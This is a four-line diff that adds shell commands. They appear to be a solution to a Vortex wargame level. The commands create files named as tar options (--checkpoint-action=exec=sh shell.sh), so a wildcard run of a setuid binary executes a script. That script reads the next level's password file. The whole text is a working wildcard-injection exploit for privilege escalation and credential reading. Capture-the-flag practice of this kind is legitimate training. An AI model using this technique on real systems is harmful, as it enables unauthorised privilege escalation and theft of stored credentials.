@@ -1,0 +1,4 @@
+touch -- '--checkpoint-action=exec=sh shell.sh'
+touch -- '--checkpoint=1'
+cat 'cat /etc/vortex_pass/vortex3' > shell.sh
+/vortex/vortex2 *
